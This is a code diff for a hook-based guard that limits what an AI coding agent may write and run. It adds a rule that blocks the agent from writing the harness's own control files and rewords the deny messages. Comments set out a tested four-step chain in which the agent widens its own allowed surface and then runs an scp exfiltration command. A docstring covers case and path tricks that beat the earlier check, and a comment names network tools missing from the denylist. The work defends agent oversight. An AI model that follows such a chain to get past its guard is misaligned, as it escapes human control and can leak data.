@@ -297,6 +297,7 @@ import yaml
 from pydantic import ValidationError
 
 from harness.config import HarnessConfig
+from harness.hook_launcher import hook_command
 from harness.killswitch import DISABLED_CHECK_SRC
 from harness.review import ReviewError, is_test_diff, load_review
 from harness.settings_paths import prepare_managed_settings, write_managed_settings
@@ -602,6 +603,97 @@ def _is_scratch_surface_path(path: str) -> bool:
 
     normalized = posixpath.normpath(path or "")
     return normalized.startswith(SCRATCH_DIR_PREFIX)
+
+
+# ---------------------------------------------------------------------------
+# Floor do plano de controle (Python real, IMPORTÁVEL) — Item 0 do plano v2 da
+# correção do dogfood `Savant.Backend`. Escrita do AGENTE em `.harness/**` é
+# deny INCONDICIONAL, com as duas exceções que já têm regra própria
+# (`.harness/work/**` = autoria do próximo contrato, `.harness/scratch/**` =
+# artefato temporário).
+#
+# Por que virou floor, e não mais uma checagem de superfície: até aqui o único
+# gate sobre `.harness/harness.yaml` era a superfície do contrato ativo — e a
+# superfície é ampliável pelo próprio agente via `harness task add-file`, que
+# não validava path (ver `harness.contract.add_task_file`). Isso fechava uma
+# cadeia de auto-ampliação de superfície de COMANDO, provada por execução
+# contra o guard gerado do HEAD:
+#
+#   1. `harness task add-file T-01 .harness/harness.yaml`  -> allow
+#   2. `Write .harness/harness.yaml`                       -> allow (era deny)
+#   3. `harness compile-session`                           -> allow, re-bakeia
+#   4. `scp <arquivo> user@host:/tmp`                      -> allow (era deny)
+#
+# Quatro tool calls, nenhum toque humano, e o floor de rede não é atravessado
+# em nenhum passo — a exposição é exatamente tudo o que a denylist do floor não
+# enumera (`ssh`, `scp`, `rsync`, `nc`, `docker run`, `certutil -urlcache`).
+#
+# A correção é deliberadamente em DUAS camadas: `add_task_file` recusa o path
+# na entrada, e este floor recusa a escrita mesmo que o path entre na
+# superfície por qualquer outra via (`files[]` legado de um Plans.md já
+# compilado, edição manual do Plans.md, futura rota ainda não escrita). Uma
+# camada só reproduziria o erro que criou o furo: uma peça defensável sozinha
+# governando sozinha o plano de controle.
+#
+# O USUÁRIO continua editando `.harness/harness.yaml` no terminal próprio, fora
+# do Claude Code, onde nenhum hook intercepta — mesma postura do kill-switch.
+# ---------------------------------------------------------------------------
+CONTROL_PLANE_DIR_NAME = ".harness"
+CONTROL_PLANE_WRITABLE_DIRS = ("work", "scratch")
+#: Arquivo ÚNICO de `.harness/` que o agente pode escrever. `progress.md` é
+#: bookkeeping do próprio harness: o lifecycle (passo 12) manda atualizá-lo a
+#: cada sessão e o `runtime_audit` dá warning se ausente — negá-lo tornaria o
+#: produto contraditório consigo mesmo (é o issue 3 do dogfood aegis, que a
+#: exceção `_is_progress_file_path` existe para corrigir). Entrou como FILE, e
+#: não como diretório em `CONTROL_PLANE_WRITABLE_DIRS`, porque a ampliação de
+#: superfície fica de um arquivo nomeado: `.harness/progress.md/qualquer` e
+#: `.harness/sub/progress.md` continuam deny.
+CONTROL_PLANE_WRITABLE_FILES = ("progress.md",)
+
+
+def is_floor_control_plane_path(path: str) -> bool:
+    """True se `path` aponta para o plano de controle do harness
+    (`.harness/**`) FORA das duas áreas com regra própria (`work/`, `scratch/`).
+
+    Casa por SEGMENTO e case-INSENSITIVE, não por prefixo literal. As duas
+    escolhas são correções do desenho anterior, que era prefixo
+    case-sensitive e foi contornado em execução real:
+
+    - **Caixa.** No Windows — plataforma exata do dogfood que originou este
+      floor — `.Harness\\harness.yaml` e `.harness\\harness.yaml` são o MESMO
+      arquivo. Com o predicado case-sensitive, trocar a caixa fazia
+      `add_task_file` aceitar o path E o guard devolver `allow`, reabrindo a
+      cadeia de auto-ampliação inteira. As duas camadas do Item 0 compartilham
+      este predicado, então elas caíam juntas: não eram duas barreiras, eram
+      uma barreira instanciada duas vezes. Lowercase incondicional (mesma
+      postura de `is_floor_secret_path` e `is_floor_disable_sentinel_path`) —
+      em POSIX isso nega um `.Harness/` que seria um diretório distinto e
+      inofensivo, e esse falso-deny é o lado certo para errar num floor.
+    - **Segmento.** `_evaluate_file` recebe o path já relativizado à raiz do
+      repo, mas a relativização não acontece quando o path aponta para fora
+      dela (outro drive, outro projeto). Um `C:/outro/.harness/harness.yaml`
+      não tem o prefixo e escapava. Procurar o segmento `.harness` em qualquer
+      posição cobre as duas formas com uma regra só.
+
+    A conversão de `\\` para `/` vem ANTES do `normpath` (o anterior fazia
+    depois): em POSIX o `normpath` não entende barra invertida como separador,
+    então `.harness\\work\\..\\harness.yaml` não colapsava.
+
+    As exceções são casadas no segmento SEGUINTE ao `.harness` — e só no
+    primeiro `.harness` encontrado, que é o plano de controle do repo."""
+    import posixpath
+
+    normalized = posixpath.normpath((path or "").replace("\\", "/")).lower()
+    segments = [s for s in normalized.split("/") if s not in ("", ".")]
+    for index, segment in enumerate(segments):
+        if segment == CONTROL_PLANE_DIR_NAME:
+            rest = segments[index + 1:]
+            if not rest:
+                return True
+            if rest[0] in CONTROL_PLANE_WRITABLE_DIRS:
+                return False
+            return not (len(rest) == 1 and rest[0] in CONTROL_PLANE_WRITABLE_FILES)
+    return False
 
 
 def _is_progress_file_path(path: str) -> bool:
@@ -946,6 +1038,25 @@ def _contract_fully_passed(feature_list: Any) -> bool:
     if not passes_map:
         return False
     return all(passes_map.values())
+
+
+def _pending_task_id(feature_list: Any) -> str:
+    """Id da primeira feature ainda pendente (`passes` falso) de
+    `feature_list` — o `task_id` que o agente deve passar para
+    `harness task add-file`. `<task_id>` literal quando não há pendente ou o
+    formato não é reconhecível.
+
+    Item 5 do backlog do dogfood `Savant.Backend`: o que separa "existe um
+    comando" de "cole isto" é o id já preenchido. A mensagem de deny é lida
+    por um agente que acabou de ser bloqueado; obrigá-lo a abrir o
+    `feature_list.json` para descobrir o id é o custo que o item existe para
+    remover. Ordem de iteração = ordem de declaração no Plans.md, que é a
+    ordem em que as tarefas são executadas — a primeira pendente é a tarefa
+    corrente na esmagadora maioria dos casos."""
+    for feature_id, passes in _feature_passes_map(feature_list).items():
+        if not passes:
+            return str(feature_id)
+    return "<task_id>"
 
 
 def _transitions_to_true(old_data: Any, new_data: Any) -> list[Any]:
@@ -1321,6 +1432,10 @@ def render_boundary_guard(
         f"SCRATCH_DIR_PREFIX = {SCRATCH_DIR_PREFIX!r}",
         inspect.getsource(_is_work_surface_path),
         inspect.getsource(_is_scratch_surface_path),
+        f"CONTROL_PLANE_DIR_NAME = {CONTROL_PLANE_DIR_NAME!r}",
+        f"CONTROL_PLANE_WRITABLE_DIRS = {CONTROL_PLANE_WRITABLE_DIRS!r}",
+        f"CONTROL_PLANE_WRITABLE_FILES = {CONTROL_PLANE_WRITABLE_FILES!r}",
+        inspect.getsource(is_floor_control_plane_path),
         f"PROGRESS_FILE_PATH = {PROGRESS_FILE_PATH!r}",
         inspect.getsource(_is_progress_file_path),
         inspect.getsource(_is_claude_memory_path),
@@ -1340,6 +1455,7 @@ def render_boundary_guard(
         inspect.getsource(_parse_iso8601),
         inspect.getsource(_feature_passes_map),
         inspect.getsource(_contract_fully_passed),
+        inspect.getsource(_pending_task_id),
         inspect.getsource(_transitions_to_true),
         inspect.getsource(_read_last_commit_timestamp),
         f"UNSCOPED_EVIDENCE_DIR_NAME = {UNSCOPED_EVIDENCE_DIR_NAME!r}",
@@ -1448,11 +1564,31 @@ def _protected_branch_commit_problem(command, cwd):
     if branch is None or branch not in PROTECTED_BRANCHES:
         return None
     return (
-        "branch protegida '" + branch + "' - commit direto proibido, so via "
-        "PR; rode `harness compile-session` para criar/mudar para a branch "
-        "de contrato (contract/<slug>)"
+        "branch protegida '" + branch + "' - commit direto proibido, so via PR. "
+        "A MENSAGEM do commit NAO e o problema: `-m`, `-F -` e mensagem "
+        "multi-linha sao todos allow fora de branch protegida - nao reescreva a "
+        "mensagem, troque de branch. Saida: `git checkout -b <tipo>/<slug>` "
+        "(ex.: feat/minha-mudanca) e commite la; ou rode `harness "
+        "compile-session`, que posiciona em contract/<slug> automaticamente "
+        "quando ha contrato ativo"
     )
 
+
+# Item 5 do backlog do dogfood Savant.Backend: o deny de comando mandava
+# "replaneje via /harness-creator:plan", que e o caminho MAIS CARO e, para
+# comando, nem sequer o certo - replanejar muda files[]/verify_cmd de uma
+# tarefa, nao a allowlist permanente. O escape real e o YAML de governanca, e
+# ele so pode ser editado pelo usuario no terminal proprio (o agente nao
+# escreve em .harness/** - floor do plano de controle). Dizer isso na hora do
+# deny evita o ciclo de tentativa-e-erro que a sessao real gastou.
+_COMMAND_ESCAPE_HINT = (
+    "Escapes, do mais barato ao mais caro: (1) se o comando ja e equivalente a "
+    "um declarado, use a forma EXATA do verify_cmd/lint do contrato; (2) se o "
+    "repo precisa deste comando de forma permanente, PECA AO USUARIO para "
+    "adiciona-lo em governance.extra_allowed_commands do .harness/harness.yaml "
+    "(terminal dele, fora do Claude Code) e rodar `harness compile-session`; "
+    "(3) replaneje via /harness-creator:plan so se o ESCOPO da tarefa mudou."
+)
 
 FEATURE_LIST_PATH = ".harness/feature_list.json"
 PROFILE_PATH = ".harness/repo-profile.json"
@@ -1835,6 +1971,18 @@ def _evaluate_file(path, cwd):
             "no SEU terminal (fora do Claude Code, onde nenhum hook intercepta)"
         )
 
+    if is_floor_control_plane_path(path):
+        return "deny", (
+            "runtime floor: escrita no plano de controle do harness (.harness/**, "
+            "exceto work/ e scratch/) e bloqueio incondicional - estes arquivos "
+            "DEFINEM a superficie que o guard aplica, entao edita-los seria "
+            "auto-ampliacao de superficie sem gate humano; declara-los em files[] "
+            "de uma tarefa NAO abre excecao. Se a governanca precisa mudar, edite "
+            ".harness/harness.yaml no SEU terminal (fora do Claude Code) e rode "
+            "`harness compile-session`; para o proximo contrato, use "
+            ".harness/work/<slug>/ (sempre gravavel)"
+        )
+
     if _is_claude_memory_path(path):
         return "allow", (
             "diretorio de memoria do Claude Code (.claude/projects/<slug>/memory/**) "
@@ -1899,8 +2047,11 @@ def _evaluate_file(path, cwd):
     return "deny", (
         "arquivo fora da superficie do contrato ativo (nenhuma tarefa declara este "
         "path em files[]); artefato temporario de verificacao (screenshot, dump, "
-        "HTML de debug)? salve em .harness/scratch/ ; se o escopo mudou, replaneje "
-        "via /harness-creator:plan"
+        "HTML de debug)? salve em .harness/scratch/ ; se este arquivo PERTENCE ao "
+        "escopo ja aprovado, o escape barato e `harness task add-file "
+        + _pending_task_id(feature_list) + " " + path + "` (um comando, sem "
+        "replanejar - ja liberado no guard); replaneje via /harness-creator:plan "
+        "so se o ESCOPO mudou de verdade"
     )
 
 
@@ -1984,13 +2135,13 @@ def _evaluate_bash(command, cwd):
             "segmento '" + failing[:80] + "' fora da superficie compilada do "
             "contrato (verify_cmd/lint/typecheck/build/install/git local) e "
             "nao aceito como utilitario read-only (cat/head/tail/wc/grep/rg/"
-            "ls/echo/find sem redirecionamento de escrita) nem cd intra-repo; "
-            "replaneje via /harness-creator:plan se precisar de outro comando"
+            "ls/echo/find sem redirecionamento de escrita) nem cd intra-repo. "
+            + _COMMAND_ESCAPE_HINT
         )
     return "deny", (
         "comando fora da superficie compilada do contrato "
-        "(verify_cmd/lint/typecheck/build/install/git local); replaneje via "
-        "/harness-creator:plan se precisar de outro comando"
+        "(verify_cmd/lint/typecheck/build/install/git local). "
+        + _COMMAND_ESCAPE_HINT
     )
 
 
@@ -2102,8 +2253,8 @@ def _evaluate_powershell(command, cwd):
             "(verify_cmd/lint/typecheck/build/install/git local) - PowerShell"
         )
     return "deny", (
-        "comando fora da superficie compilada do contrato (PowerShell); "
-        "replaneje via /harness-creator:plan se precisar de outro comando"
+        "comando fora da superficie compilada do contrato (PowerShell). "
+        + _COMMAND_ESCAPE_HINT
     )
 
 
@@ -2345,7 +2496,10 @@ def install_boundary_guard(target_dir: Path) -> Path:
         encoding="utf-8",
     )
 
-    command = f'python "{script_path}"'
+    # Item 1 do backlog do dogfood Savant.Backend: interpretador ABSOLUTO
+    # bakeado (nao `python` nu resolvido pelo PATH de runtime) — ver
+    # `harness.hook_launcher` para o porque e o risco residual.
+    command = hook_command(script_path)
 
     # Destino machine-local + `.gitignore` tool-owned (`.harness/` e
     # `.claude/`) + a superfície de scratch (Garantia 4), tudo pelo ponto
@@ -2375,8 +2529,25 @@ def install_boundary_guard(target_dir: Path) -> Path:
             for h in entry.get("hooks", [])
         )
 
+    def _references_our_script(entry: dict[str, Any]) -> bool:
+        """Entrada que aponta para o NOSSO script, independente da forma do
+        comando. Necessário desde que o formato do `command` mudou (`python
+        "<script>"` -> `"<interp absoluto>" "<script>"`, Item 1 do backlog do
+        dogfood Savant.Backend): sem isto, um `settings.json` cuja entrada
+        antiga não conste do `compiled-state-session.json` (state apagado,
+        repo clonado com o settings versionado) sobreviveria ao merge e o
+        guard rodaria DUAS vezes por tool call. Casa por nome de arquivo, o
+        mesmo critério já usado por `_is_legacy_guard_tests` acima."""
+        return any(
+            BOUNDARY_HOOK_FILENAME in (h.get("command") or "")
+            for h in entry.get("hooks", [])
+        )
+
     kept_entries = [
-        e for e in pre if not _is_old_managed(e) and not _is_legacy_guard_tests(e)
+        e for e in pre
+        if not _is_old_managed(e)
+        and not _is_legacy_guard_tests(e)
+        and not _references_our_script(e)
     ]
     new_entry = {
         "matcher": BOUNDARY_HOOK_MATCHER,
